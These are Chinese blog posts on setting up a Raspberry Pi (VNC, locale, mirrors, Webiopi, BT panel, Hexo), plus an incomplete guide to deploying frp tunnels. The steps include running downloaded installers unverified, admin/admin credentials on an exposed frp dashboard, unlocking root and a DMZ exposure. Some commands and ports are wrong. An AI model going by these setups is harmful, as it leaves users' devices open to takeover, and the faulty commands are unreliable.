<h2 id="连接VNC"><a href="#连接VNC" class="headerlink" title="连接VNC"></a>连接VNC</h2><p>在RealVnc设置ip等，连接。提示输入密码，就是之前设置的那个。</p>
<p><img  src="https://pic.izhaoo.com/20170920111347.jpg"  ><span class="image-caption">vnc设置</span></p>
<p><img  src="https://pic.izhaoo.com/20170920111404.jpg"  ><span class="image-caption">vnc连接</span></p>
<p><img  src="https://pic.izhaoo.com/20170920112306.jpg"  ><span class="image-caption">输入密码</span></p>
<p>OK！连接成功！</p>
<p><img  src="https://pic.izhaoo.com/20170920112320.jpg"  ><span class="image-caption">连接成功</span></p>
<h1 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h1><p>树莓派默认使用英文，对于我这种英语渣，就难以驾驭了。本文将介绍如何汉化树莓派。</p>
<p>树莓派默认没装中文字库，如果强行更改语言为“中文”的话，会显示乱码或方块文。</p>
<p>所以我们要先安装一个第三方字库。</p>
<pre><code>sudo apt-get install ttf-wqy-zenhei</code></pre><p>按“y”同意，并回车继续。</p>
<p>然后我们再安装一个中文输入法。</p>
<pre><code>sudo apt-get install scim-pinyin</code></pre><p>同样按“y”同意，并回车继续。</p>
<p>安装完毕后我们要设置中文显示。</p>
<pre><code>sudo raspi-config</code></pre><p>ps. 上下方向键选择，回车进入。</p>
<p>“Internationalisation Options” –&gt; “change_locale” –&gt; “Default locale for the system environment:”</p>
<p><img  src="https://pic.izhaoo.com/20170921081820.jpg"  ><span class="image-caption">语言配置</span></p>
<p>ps. 光标上下移动，空格打“*”选择或取消。</p>
<p>选择“zh_CN.UTF-8 UTF-8”，取消“en_GB.UTF-8 UTF-8”。</p>
<p>然后按“tab”键将光标移到“ok”，回车保存。</p>
<p>重启一下。</p>
<pre><code>sudo shutdown -r now</code></pre><p>重启后显示中文了，按“ctrl + space”还可以切换中文输入法。</p>
<p><img  src="https://pic.izhaoo.com/20170921082603.jpg"  ><span class="image-caption">显示中文</span></p>
<p>OK！中文是全世界最美（keng）的语言！</p>
<h1 id="Vim文本编辑器-安装及设置代码高亮"><a href="#Vim文本编辑器-安装及设置代码高亮" class="headerlink" title="Vim文本编辑器 - 安装及设置代码高亮"></a>Vim文本编辑器 - 安装及设置代码高亮</h1><p>树莓派默认安装的文本编辑器是“nano”，燃鹅我并不喜欢，还是我“vim”最好。虽说树莓派也安装了“vim”，但是比较诡异，可能是变异了吧，完全不符合一般人的使用逻辑。</p>
<p>首先我们要卸载“变异版vim”。</p>
<pre><code>sudo apt-get remove vim-common</code></pre><p>再重新安装“正常版vim”。</p>
<pre><code>sudo apt-get install vim</code></pre><p>按“y”同意并回车，“vim”就安装好了。</p>
<p>“vim”具体的使用命令可以问问度娘。</p>
<p>接下来我们还需要配置代码高亮显示，嘛，必备的。</p>
<p>在~目录下面新建”.vimrc”文件。</p>
<pre><code>pi@raspberrypi ~ $ cd ~
pi@raspberrypi ~ $ vim .vimrc

set number
syntax on
set tabstop=4</code></pre><p>OK！代码高亮也配置完成。</p>
<h1 id="更换为国内更新源"><a href="#更换为国内更新源" class="headerlink" title="更换为国内更新源"></a>更换为国内更新源</h1><p>树莓派默认更新源服务器位于国外，虽说没被墙，但下载速度太感人了，还是有必要换成国内源的。</p>
<h2 id="更新-2017-10-04"><a href="#更新-2017-10-04" class="headerlink" title="更新-2017.10.04"></a>更新-2017.10.04</h2><p>修改“/etc/apt/sources.list”</p>
<pre><code>deb http://mirrors.ustc.edu.cn/raspbian/raspbian/ jessie main contrib non-free</code></pre><p>修改“/etc/apt/sources.list.d/raspi.list”</p>
<pre><code>deb http://mirrors.ustc.edu.cn/archive.raspberrypi.org/debian/ jessie main</code></pre><p>！！！ “wheezy”、“jessie”、“stretch”根据自己的改字段</p>
<p>！！！ 以下内容作废，可参考过程。</p>
<h2 id="更换阿里云源"><a href="#更换阿里云源" class="headerlink" title="更换阿里云源"></a>更换阿里云源</h2><p>这里我们以阿里云源为例说明如何更换更新源。</p>
<p>编辑“/etc/apt/sources.list”文件，将原来的源加“#”注释掉，再将以下阿里云源粘贴即可。</p>
<pre><code>sudo nano /etc/apt/sources.list   #编辑“sources.list”文件</code></pre><pre><code>deb http://mirrors.aliyun.com/raspbian/raspbian/ jessie main contrib non-free    #阿里云源
deb-src http://mirrors.aliyun.com/raspbian/raspbian/ jessie main contrib non-free    #阿里云源</code></pre><p><img  src="https://pic.izhaoo.com/20170921085740.jpg"  ><span class="image-caption">更换源</span></p>
<p>！！！ wheezy系统务必将上面的“jessie”字段换成“wheezy”。</p>
<pre><code>sudo apt-get update &amp;&amp; apt-get upgrade -y     #更新源&amp;更新系统</code></pre><p><img  src="https://pic.izhaoo.com/20170921091143.jpg"  ><span class="image-caption">更新系统和源</span></p>
<h2 id="国内源列表"><a href="#国内源列表" class="headerlink" title="国内源列表"></a>国内源列表</h2><pre><code>中国科学技术大学
Raspbian http://mirrors.ustc.edu.cn/raspbian/raspbian/

阿里云
Raspbian http://mirrors.aliyun.com/raspbian/raspbian/

清华大学
Raspbian http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/

华中科技大学
Raspbian http://mirrors.hustunique.com/raspbian/raspbian/
Arch Linux ARM http://mirrors.hustunique.com/archlinuxarm/

华南农业大学（华南用户）
Raspbian http://mirrors.scau.edu.cn/raspbian/

大连东软信息学院源（北方用户）
Raspbian http://mirrors.neusoft.edu.cn/raspbian/raspbian/

重庆大学源（中西部用户）
Raspbian http://mirrors.cqu.edu.cn/Raspbian/raspbian/

中山大学 已跳转至中国科学技术大学源
Raspbian http://mirror.sysu.edu.cn/raspbian/raspbian/

新加坡国立大学（国外）
Raspbian http://mirror.nus.edu.sg/raspbian/raspbian

牛津大学（国外）
Raspbian http://mirror.ox.ac.uk/sites/archive.raspbian.org/archive/raspbian/

韩国KAIST大学（国外）
Raspbian http://ftp.kaist.ac.kr/raspbian/raspbian/</code></pre><h1 id="绑定域名-让外网可以访问树莓派"><a href="#绑定域名-让外网可以访问树莓派" class="headerlink" title="绑定域名 - 让外网可以访问树莓派"></a>绑定域名 - 让外网可以访问树莓派</h1><p>树莓派绑定域名，让外网也可以通过域名访问。</p>
<h2 id="2017-09-27"><a href="#2017-09-27" class="headerlink" title="2017-09-27"></a>2017-09-27</h2><p>今天发现，学校虽然是公网IP，但还是有租期，也就是说跳IP。只能路由器DDNS咯。</p>
<h2 id="2017-09-26"><a href="#2017-09-26" class="headerlink" title="2017-09-26"></a>2017-09-26</h2><p>这几天一直在渡劫，如何给树莓派绑定域名，搭建一台小型服务器。然后我试了以下方式。</p>
<p>|:————- :|:————-:|<br>|花生壳-DDNS|要实名交钱，太麻烦|<br>|Dnspod-DDNS|脚本没成功|<br>|ngrok-内网穿透|要敲的代码太多，太麻烦|<br>|frp-内网穿透|本地端没配置成功，是个bug|</p>
<p>总之就是遇到各种问题。</p>
<p>然后我向大学校友（老乡）求救，他居然说……学校是公网IP，不封80端口。WTF？！好吧，一看还真是。MD，我这两天在搞什么事情。</p>
<p>然后直接解析域名到学校IP，路由器开个DMZ，就那么简单。唉，作死我，好气哟。</p>
<h1 id="Webiopi-通过网页控制GPIO"><a href="#Webiopi-通过网页控制GPIO" class="headerlink" title="Webiopi - 通过网页控制GPIO"></a>Webiopi - 通过网页控制GPIO</h1><p>在树莓派上安装Webiopi，通过Web页面控制GPIO。</p>
<h2 id="Webiopi"><a href="#Webiopi" class="headerlink" title="Webiopi"></a>Webiopi</h2><p><a href="http://webiopi.trouch.com">Webiopi</a>（Web Internet Of RaspberryPi）。就是在树莓派上搭建一个Web页面，从而控制树莓派上的GPIO接口。比如说你可以远程点个LED啊，点个蜂鸣器啊。如果接个继电器，还可以点个电灯，点个空调。哇！我仿佛叩开了物联网（IOT）的大门。</p>
<p><img  src="https://pic.izhaoo.com/20170928211527.jpg"  ><span class="image-caption">webiopi</span></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol>
<li>安装python开发版</li>
</ol>
<pre><code>sudo apt-get install python-dev</code></pre><ol start="2">
<li>安装GPIO</li>
</ol>
<p>到<a href="https://pypi.python.org/pypi/RPi.GPIO">python-gpio页面</a>下载最新的python-gpio压缩包。</p>
<p><img  src="https://pic.izhaoo.com/20170928202804.jpg"  ><span class="image-caption">gpio</span></p>
<p>然后上传到树莓派。（可以通过宝塔面板或ftp上传）</p>
<p>cd 到压缩包目录，解压缩，安装。</p>
<p>！！！ 代码中的版本改成你下载的版本。</p>
<pre><code>tar -xvzf RRPi.GPIO-0.6.3.tar.gz

cd WebIOPi-0.6.3

sudo ./setup.sh</code></pre><ol start="3">
<li>安装Webiopi</li>
</ol>
<p>到<a href="http://webiopi.trouch.com/DOWNLOADS.html">webiopi项目官网</a>下载最新的webiopi压缩包。</p>
<p><img  src="https://pic.izhaoo.com/20170928210103.jpg"  ><span class="image-caption">webiopi</span></p>
<p>同样上传到树莓派，解压缩，安装。</p>
<pre><code>tar xvzf WebIOPi-0.7.1.tar.gz
cd WebIOPi-0.7.1
sudo ./setup.sh</code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>修改webiopi的默认密码。</p>
<pre><code>sudo webiopi-passwd</code></pre><p>输入默认用户名“webiopi”，然后输入你需要更改的密码两次。</p>
<p>启动webiopi。</p>
<pre><code>sudo /etc/init.d/webiopi start</code></pre><p>设置开机自动启动。</p>
<pre><code>sudo update-rc.d webiopi defaults</code></pre><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>然后用浏览器打开页面 –&gt; “<a href="http://192.168.31.23:8000/webiopi/”">http://192.168.31.23:8000/webiopi/”</a></p>
<p>！！！ 地址换成你树莓派的地址，端口默认为“8000”。绑定了域名的树莓派也可以域名访问。</p>
<p>提示输入用户名密码。</p>
<pre><code>默认用户名：webiopi
密码：刚你自己改的那个，不改默认是“webiopi”</code></pre><p>然后看到以下界面就说明安装成功了。</p>
<p><img  src="https://pic.izhaoo.com/20170928210648.jpg"  ><span class="image-caption">安装成功</span></p>
<p>点第一项进入控制页面。其他几项也可以研究下，监控界面什么的。</p>
<p><img  src="https://pic.izhaoo.com/20170928211527.jpg"  ><span class="image-caption">控制页面</span></p>
<h2 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h2><ul>
<li>点击外侧的“IN/OUT”切换GPIO的工作模式，输入/输出</li>
<li>输出模式下，点击内侧的数字，切换输出电平，高/低</li>
<li>输入模式下，内测数字代表GPIO的输入状态</li>
</ul>
<h1 id="更换默认用户密码-amp-启用Root超级用户"><a href="#更换默认用户密码-amp-启用Root超级用户" class="headerlink" title="更换默认用户密码&amp;启用Root超级用户"></a>更换默认用户密码&amp;启用Root超级用户</h1><p>给树莓派默认用户“pi”更换默认密码，启用Root超级用户。</p>
<p>最近在折腾给树莓派接公网安装服务器跑脚本什么的，既然接到公网嘛，用树莓派默认用户密码肯定是不安全的，指不定什么时候给脚本小子H了。（嗯，多虑了，谁会在意我怎么个破盒子）</p>
<p>那么我们就把树莓派默认用户密码给换了吧，增加点安全性。顺便把Root超级用户也开了，方便整事儿。</p>
<h2 id="更改默认密码"><a href="#更改默认密码" class="headerlink" title="更改默认密码"></a>更改默认密码</h2><pre><code>sudo passwd pi    #更换“pi”超级用户密码。</code></pre><p>两次输入密码，回车，OK。</p>
<h2 id="启用Root用户"><a href="#启用Root用户" class="headerlink" title="启用Root用户"></a>启用Root用户</h2><pre><code>sudo passwd root    #更换“root”超级用户密码。</code></pre><p>两次输入密码，回车，OK。</p>
<pre><code>sudo passwd --unlock root    #开启Root用户</code></pre><h1 id="BerryBoot-通过WiFi连接VNC远程桌面"><a href="#BerryBoot-通过WiFi连接VNC远程桌面" class="headerlink" title="BerryBoot - 通过WiFi连接VNC远程桌面"></a>BerryBoot - 通过WiFi连接VNC远程桌面</h1><p>通过WiFi给BerryBoot添加VNC远程桌面。</p>
<p>BerryBoot可能有童鞋了解，是给树莓派安装多系统的引导程序。问题又来了，作为苦逼的大学党，没有显示器。（其实这次返校从家里带了只旧显示器的，燃鹅，等我安到墙上后才发现，显示器是坏的→_→）没办法，试试看能不能VNC，别说还真可以，不过国内好像还没这方面教程，我是狗狗来的。</p>
<h2 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h2><p>首先将安装BerryBoot的SD卡连接电脑，有个名为“boot”的FAT盘，打开它。</p>
<p>打开“cmdline.txt”文件，改成：</p>
<pre><code>smsc95xx.turbo_mode=N elevator=deadline quiet bootmenutimeout=30 vncinstall ipv4=192.168.1.152/255.255.255.0/192.168.1.1/wlan0</code></pre><p>PS. “cmdline.txt”源文件： <code>elevator=deadline bootmenutimeout=10 datadev=mmcblk0p2</code></p>
<p>！！！注意    “192.168.1.152”改成你的树莓派IP    “192.168.1.1”改成你的网关（路由器地址）    “bootmenutimeout=30”是默认时间，长短随你</p>
<p>新建一个“wpa_supplicant.conf”文件，写入：</p>
<pre><code>country=CN
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1

network=&#123;
ssid=&quot;zhaoo&quot; #ssid（wifi用户名）
psk=&quot;12345678&quot; #password（wifi密码）
priority=1 #优先级
&#125;</code></pre><p>然后插回SD卡上电开机，看到绿灯一闪一闪说明树莓派连上WiFi了。</p>
<p>打开VNCViewer，输入树莓派IP地址连接，端口是5900（可不填写），默认无帐号密码。</p>
<p>！！！注意    色彩要改成24位真彩色，其他的显示不出。</p>
<p><img  src="https://pic.izhaoo.com/20171015131949.jpg"  ><span class="image-caption">berryboot-vnc</span></p>
<p><img  src="https://pic.izhaoo.com/20171015133429.jpg"  ><span class="image-caption">berryboot-vnc</span></p>
<h1 id="宝塔面板"><a href="#宝塔面板" class="headerlink" title="宝塔面板"></a>宝塔面板</h1><p>在树莓派上部署宝塔面板，搭建网站。</p>
<h2 id="认识宝塔面板"><a href="#认识宝塔面板" class="headerlink" title="认识宝塔面板"></a>认识宝塔面板</h2><p><a href="https://www.bt.cn/">宝塔面板官网</a></p>
<p>建站的朋友都熟悉宝塔面板吧，这是个好东西。宝塔面板可以理解为一个工具集，能一键创建网站、FTP、数据库、SSL；安全管理，计划任务，文件管理，PHP多版本共存及切换。试想一下，如果我们要在一个服务器上搭建一个动态网站，需要部署php、数据库……balabala一大堆，多麻烦。Linux技术不好的同学还老是遇到各种问题。（说我自己）而宝塔面板呢，只要简单部署一下，点点鼠标就解决了，还可以在任意服务间切换呢，什么时候网站被黑了出现大量并发，马上把Apache换成Nginx。</p>
<p>那么树莓派上部署这玩意儿有什么意义呢？哈！没意义！瞎折腾咯~且不说做网站这么好玩的事。拿来监控监控cpu和内存也是不错的。</p>
<p><img  src="https://pic.izhaoo.com/20170923215657.jpg"  ><span class="image-caption">cpu&amp;内存监控</span></p>
<h2 id="树莓派安装宝塔面板"><a href="#树莓派安装宝塔面板" class="headerlink" title="树莓派安装宝塔面板"></a>树莓派安装宝塔面板</h2><p>树莓派jessie系统是基于debian开发的，所以可以完美套用debian系统安装命令。</p>
<p><img  src="https://pic.izhaoo.com/20170923083600.jpg"  ><span class="image-caption">jessie</span></p>
<pre><code>wget -O install.sh http://download.bt.cn/install/install-ubuntu.sh &amp;&amp; bash install.sh</code></pre><p>一段代码搞定，easy吧。提示请输入“y”同意哦。等一会儿命令执行完的时候会返回宝塔面板默认用户名（admin）和密码（密匙），用这个用户名密码密码登陆宝塔面板，然后记得改下用户名密码。</p>
<p>ps. 地址：树莓派内网地址:8888     比如我是 192.168.31.23:8888</p>
<p><img  src="https://pic.izhaoo.com/20170923221740.jpg"  ><span class="image-caption">更改用户名密码</span></p>
<h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><p>这个也没什么好说的，到软件管理界面，点点鼠标，选择一个合适的版本安装就好了。</p>
<p><img  src="https://pic.izhaoo.com/20170923221919.jpg"  ><span class="image-caption">软件安装</span></p>
<p>说明一下，就树莓派这小心脏，很卡。可以要安装个把小时。建议准备咖啡和书，或是来一局惊心动魄的……王者农药。（说好的卸农药）</p>
<h2 id="LNMPA拓展"><a href="#LNMPA拓展" class="headerlink" title="LNMPA拓展"></a>LNMPA拓展</h2><p>大家都知道树莓派这么个小玩意儿虽说五脏俱全，但性能终归是有限。不停地跑宝塔面板，cpu发热严重。那我们来装一个轻量级包包吧–LNMP一键安装包。还有，宝塔面板只能LNMP或LAMP二选一，而LNMPA一键安装包可以融合以上两者灵活应对不同情况。不说了，给个链接自个儿了解吧。</p>
<p><a href="https://lnmp.org/">LNMP一键安装包官网</a></p>
<h1 id="PiDashboard-安装树莓派专用仪表盘"><a href="#PiDashboard-安装树莓派专用仪表盘" class="headerlink" title="PiDashboard - 安装树莓派专用仪表盘"></a>PiDashboard - 安装树莓派专用仪表盘</h1><p>给树莓派安装Pi-Dashboard仪表盘，监控运行状况。</p>
<h2 id="Pi-Dashboard仪表盘"><a href="#Pi-Dashboard仪表盘" class="headerlink" title="Pi-Dashboard仪表盘"></a>Pi-Dashboard仪表盘</h2><p><a href="http://maker.quwj.com/project/10">项目主页</a>    <a href="https://github.com/spoonysonny/pi-dashboard">GitHub</a></p>
<p><a href="http://pi.izhaoo.com/dashboard/">预览</a> （这是部署在我树莓派上的页面，如果能访问，说明我还在折腾）</p>
<p>之前介绍了一个宝塔面板，那是部署Web服务器用的。今天再介绍一个树莓派专用的仪表盘，用来显示树莓派的Cpu、内存、储存等信息。</p>
<p>目前已加入的监测项目有：摘自<a href="http://shumeipai.nxez.com/2017/08/31/pi-dashboard-released.html">树莓派实验室</a></p>
<ul>
<li>CPU 基本信息、状态和使用率等实时数据</li>
<li>内存、缓存、SWAP分区使用的实时数据</li>
<li>SD卡（磁盘）的占用情况</li>
<li>实时负载数据</li>
<li>实施进程数据</li>
<li>网络接口的实时数据</li>
<li>树莓派IP、运行时间、操作系统、HOST 等基础信息</li>
</ul>
<p><img  src="https://pic.izhaoo.com/20170925140517.jpg"  ><span class="image-caption">树莓派仪表盘</span></p>
<h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><p>仪表盘是基于php编写的，所以我们只需搭建一个php环境即可。这里演示在宝塔面板部署 Php7.1 + Nginx1.8 （不需要MySQL）。可以参考前文。<a href="http://note.izhaoo.com/raspberrypi-install-bt-panel/">树莓派 – 部署宝塔面板</a></p>
<p>动动鼠标安装 P + N 两款软件。</p>
<p><img  src="https://pic.izhaoo.com/20170925141011.jpg"  ><span class="image-caption">php</span></p>
<p><img  src="https://pic.izhaoo.com/20170925141023.jpg"  ><span class="image-caption">nginx</span></p>
<p>然后新建网站。</p>
<p>ps. 如果你绑定了域名，可以选择绑定域名。没有的话只能填写内网ip了，酱紫外网是访问不到的。</p>
<p><img  src="https://pic.izhaoo.com/20170925141133.jpg"  ><span class="image-caption">新建网站</span></p>
<p>然后去<a href="https://github.com/spoonysonny/pi-dashboard">GitHub</a>下载最新的程序，上传到树莓派，解压到网站根目录即可。</p>
<p><img  src="https://pic.izhaoo.com/20170925141450.jpg"  ><span class="image-caption">上传</span></p>
<p>然后访问域名或IP就可以查看效果了。</p>
<h2 id="个性化"><a href="#个性化" class="headerlink" title="个性化"></a>个性化</h2><p>我们也可以改下前端代码，对仪表盘做个美化，比如可以看到我加了友情链接。不再赘述。</p>
<p><img  src="https://pic.izhaoo.com/20170925141818.jpg"  ><span class="image-caption">个性化</span></p>
<h1 id="在树莓派搭建Hexo博客"><a href="#在树莓派搭建Hexo博客" class="headerlink" title="在树莓派搭建Hexo博客"></a>在树莓派搭建Hexo博客</h1><p>本地生成Hexo静态页面，上传到树莓派3。</p>
<p>本来想着在树莓派搭个LNMP环境，然后搭建Typecho动态博客。燃鹅，惊喜总是不断的。树莓派这小Cpu小内存，MySQL内存溢出装不上（即使装上了也卡的一批），难怪网友们都是装SQLite的。所以，我还是整个Hexo静态博客吧，鱼和熊掌得得兼。</p>
<h2 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h2><p>不太了解Hexo的朋友可以先预习下我的另一篇文章。</p>
<p><a href="https://note.izhaoo.com/hexo-1-creat-blog.html">Hexo – 在GitHub搭建博客</a></p>
<p>本文不是说在树莓派上部署 Node.js + Hexo 环境，然后直接生成静态页面，我个人觉得这种方式还是会卡。所以我决定在本地部署 Node.js + Hexo 环境，然后生成静态页面，再上传到树莓派展示。酱紫实际上树莓派只是做为一个静态空间，并没有运行任何程序，内存占用几乎为0。</p>
<h2 id="本地环境搭建（前编）"><a href="#本地环境搭建（前编）" class="headerlink" title="本地环境搭建（前编）"></a>本地环境搭建（前编）</h2><p>！！！ 这部分是抄前文的，如果之前在本地已经部署过Hexo，可跳过。</p>
<p>ps. 以下操作在PC本地执行</p>
<h3 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h3><p>到<a href="http://nodejs.cn/download/">Node.js下载页面</a>下载最新客户端，并安装。只需更改安装目录，其他选项都保持默认。</p>
<h3 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h3><p>打开CMD（当然GitBash也可以）</p>
<pre><code>npm install -g hexo-cli</code></pre><p>完成后输入</p>
<pre><code>hexo</code></pre><p>出现下图所示，说明安装成功。</p>
<p><img  src="https://pic.izhaoo.com/20170907090256.jpg"  ><span class="image-caption">Hexo安装成功</span></p>
<h2 id="环境搭建（后编）"><a href="#环境搭建（后编）" class="headerlink" title="环境搭建（后编）"></a>环境搭建（后编）</h2><p>新建一个文件夹，cd到文件夹</p>
<p>安装Hexo:</p>
<pre><code>npm i -g hexo</code></pre><p>初始化Hexo：</p>
<pre><code>hexo init</code></pre><p>看下目录结构，和我一样就OK了。</p>
<p><img  src="https://pic.izhaoo.com/20170907090532.jpg"  ><span class="image-caption">目录结构</span></p>
<p>然后就是写文章，生成MaekDown，生成静态页面。balabala……不会的看我前文吧。</p>
<h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><p>ps. 以下操作在树莓派执行</p>
<p><del>刚是谁说不装任何软件来着</del> 抱歉了哈。只是觉得Nginx跑静态页面更有优势，比如说在刚并发的情况下。（我真的想多了，流量有1 ip/day就谢天谢地了）</p>
<p>我们选择先装个宝塔面板，再安装Nginx。   传送门 –&gt; <a href="http://note.izhaoo.com/raspberrypi-install-bt-panel.html">树莓派 – 部署宝塔面板</a></p>
<p>然后新建网站。</p>
<p>ps. 如果你绑定了域名，可以选择绑定域名。没有的话只能填写内网ip了，酱紫外网是访问不到的。</p>
<p><img  src="https://pic.izhaoo.com/20170925141133.jpg"  ><span class="image-caption">新建网站</span></p>
<h2 id="上传静态页面到树莓派"><a href="#上传静态页面到树莓派" class="headerlink" title="上传静态页面到树莓派"></a>上传静态页面到树莓派</h2><p>生成静态页面：</p>
<pre><code>hexo clean</code></pre><pre><code>hexo g</code></pre><p>这时候，页面就存在“public”文件夹下了。把文件夹内的文件全部上传到树莓派上的网站目录即可。装了宝塔面板的话就可以直接上传压缩包，然后解压即可。</p>
<p>OK。浏览器输入域名或IP查看效果吧。</p>
<p>不得不说，这种纯静态博客是最适合我们小树莓派了。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>hack</tag>
        <tag>树莓派</tag>
        <tag>raspberrypi</tag>
      </tags>
  </entry>
  <entry>
    <title>frp - 内网穿透</title>
    <url>/2018/05/12/frp-deploy/</url>
    <content><![CDATA[<p><code>frp</code>服务端和客户端部署，穿透内网远程连接内网设备。以腾讯云服务器(Ubuntu)、香橙派(Armbian)、小米路由器3(Padavan)为例。</p>
<span id="more"></span>

<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a href="https://github.com/fatedier/frp/blob/master/README_zh.md">frp - Github</a></p>
<p>我们部署在内网的设备，由于防火墙或动态IP等原因，外网是一般访问不到的。那么我们希望穿透内网，从外网访问该怎么操作呢？一般有以下几种方式：DDNS动态域名解析+路由器端口映射、Ngrok、Frp…</p>
<p>Ngrok和Frp的原理其实是差不多的，相比之下，Frp的部署更简单，使用效率更高，所有这里就介绍Frp的部署了。</p>
<p>通过在服务器(外网)和内网设备(内网)上分别部署Frp服务端和客户端，内网的客户端会反向连接外网的服务端，从而建立连接。然后我们只需访问外网服务器地址即可重定向到内网设备，从而达到目的。这里的服务器可以充当桥梁的作业。本篇将介绍如何在服务器和内网设备上部署Frp，没有服务器的朋友可以去网上搜索现成的Frp服务器使用，一般是免费的。</p>
<h3 id="服务端-腾讯云服务器-Ubuntu"><a href="#服务端-腾讯云服务器-Ubuntu" class="headerlink" title="服务端 - 腾讯云服务器(Ubuntu)"></a>服务端 - 腾讯云服务器(Ubuntu)</h3><p>这里用到一个脚本来方便部署。</p>
<pre><code class="bash">wget --no-check-certificate https://raw.githubusercontent.com/clangcn/onekey-install-shell/master/frps/install-frps.sh -O ./install-frps.sh    #下载脚本
chmod 755 ./install-frps.sh    #赋予权限
./install-frps.sh install    #安装脚本</code></pre>
<p>然后脚本开始运行，会让你输入一些配置，直接回车是默认配置。</p>
<pre><code class="bash">Please input frps bind_port [1-65535](Default Server Port: 5443):[7000]

#输入frp提供服务的端口，用于服务器端和客户端通信

Please input frps vhost_http_port [1-65535](Default vhost_http_port: 80):[7080]

#输入frp进行http穿透的http服务端口，建议修改防止冲突呀

Please input frps vhost_https_port [1-65535](Default vhost_https_port: 443):[70443]

#输入frp进行https穿透的https服务端口，建议修改防止冲突呀

Please input frps dashboard_port [1-65535](Default dashboard_port: 6443):[7081]

#输入frp的控制台服务端口，用于查看frp工作状态

Please input dashboard_user (Default: admin):[admin]

#登录控制台的用户名

Please input dashboard_pwd (Default: kpkpM7VZ):[admin]

#登录控制台的密码

Please input privilege_token (Default: 9m2UAOWa6hx5Eise):[admin]

#Frp服务端和客户端的通信密码

下面的内容都是默认即可</code></pre>
<p>到此服务端安装完成。</p>
<p><img  src="https://pic.izhaoo.com/20180512114749.jpg"  ><span class="image-caption">Frp服务端</span></p>
<p>综上可知，服务端配置如下:</p>
<pre><code class="bash">[common]
bind_addr = 0.0.0.0
bind_port = 7000
subdomain_host = zhaoo.cc    #后面加的，配置域名
kcp_bind_port = 7000
dashboard_port = 7081
dashboard_user = admin
dashboard_pwd = admin
vhost_http_port = 7080
vhost_https_port = 70443
log_file = ./frps.log
log_level = info
log_max_days = 3
privilege_token = admin
max_pool_count = 50
tcp_mux = true</code></pre>
<p>从配置可以看到，我又加了条主域名配置，在之后的客户端我们可以再配置子域名。配置域名后不会生效，需要添加解析：泛解析，<code>*.zhaoo.cc</code>和空解析，<code>@.zhaoo.cc</code>。</p>
<p>使用命令：</p>
<pre><code class="bash">/etc/init.d/frps start    #启动
/etc/init.d/frps stop    #关闭
/etc/init.d/frps restart    #重启
/etc/init.d/frps status    #查看状态
/etc/init.d/frps config    #查看配置
/etc/init.d/frps version    #查看版本</code></pre>
<pre><code class="bash">./install-frps.sh update      #更新
./install-frps.sh uninstall    #卸载
./install-frps.sh config    #修改配置</code></pre>
<p>开启Frp服务器后，访问<code>http:服务器IP:7081</code>可访问Frp控制台。</p>
<blockquote>
<p>Tips: 服务器如果开启了防火墙，别忘了放行以上端口哦。我用了宝塔面板，老是忘了这一茬。</p>
</blockquote>
<h3 id="客户端-香橙派-Armbian"><a href="#客户端-香橙派-Armbian" class="headerlink" title="客户端 - 香橙派(Armbian)"></a>客户端 - 香橙派(Armbian)</h3><h5 id="安装Frpc"><a href="#安装Frpc" class="headerlink" title="安装Frpc"></a>安装Frpc</h5><p>下面在香橙派上部署Frp客户端，树莓派用的是arm的cpu，所以我们要下载arm版的。</p>
<pre><code class="bash">wget https://github.com/fatedier/frp/releases/download/v0.18.0/frp_0.18.0_linux_arm.tar.gz    #下载Frp，amd版本
tar -zxvf frp_0.18.0_linux_arm.tar.gz    #解压
cd frp_0.18.0_linux_arm.tar.gz    #移动到frp目录
sudo vim frpc.ini    #编辑配置</code></pre>
<p>详细配置见下表：</p>
<pre><code class="bash">注：打&quot;*&quot;的说明要和服务器上的配置一致

#基础配置
[common]
server_addr = 服务器IP    #服务器IP
server_port = 7000    #服务器通信端口 *
privilege_token = admin    #服务器通信密码 *
login_fail_exit = false    #后续设置自动启动使用

#ssh配置
[ssh]
type = tcp    #tcp方式
local_ip = 127.0.0.1    #本地IP
local_port = 22    #本地端口
remote_port = 7122    #远程连接端口

#http配置
[http]
type = http    #http方式
local_ip = 127.0.0.1    #本地IP
local_port = 80    #本地地址
subdomain = opi    #子域名

#https配置
[https]
type = https    #https方式
local_ip = 127.0.0.1    #本地IP
local_port = 443    #本地地址
custom_domains = opi    #子域名</code></pre>
<h5 id="安装Systemd自动启动Frp"><a href="#安装Systemd自动启动Frp" class="headerlink" title="安装Systemd自动启动Frp"></a>安装Systemd自动启动Frp</h5><p>客户端的<code>Frp</code>在香橙派每次重启后都要命令开启一下，那势必要在内网先连接ssh，很麻烦。所以安装<code>Systemd</code>，在香橙派每次开机时都能自动启动Frp服务。</p>
<pre><code class="bash">apt-get install systemd    #安装systemd
apt-get install systemd-sysv    #安装systemd</code></pre>
<p>下面需要配置<code>Grub</code>文件，在开机时自动运行Systemd。</p>
<pre><code class="bash">sudo vim /etc/default/grub    #编辑grub</code></pre>
<p>写入以下内容：</p>
<pre><code class="bash">GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash init=/lib/systemd/systemd&quot;</code></pre>
<p>保存并重启一下。</p>
<p>编辑<code>Syetemd</code>配置来自启动<code>Frp</code>。</p>
<pre><code class="bash">cd 到frpc目录下
cp frpc /usr/local/bin/frpc    #复制frpc文件到系统目录
mkdir /etc/frp    #系统目录下新建frp文件夹
cp frpc.ini /etc/frp/frpc.ini    复制frpc配置文件
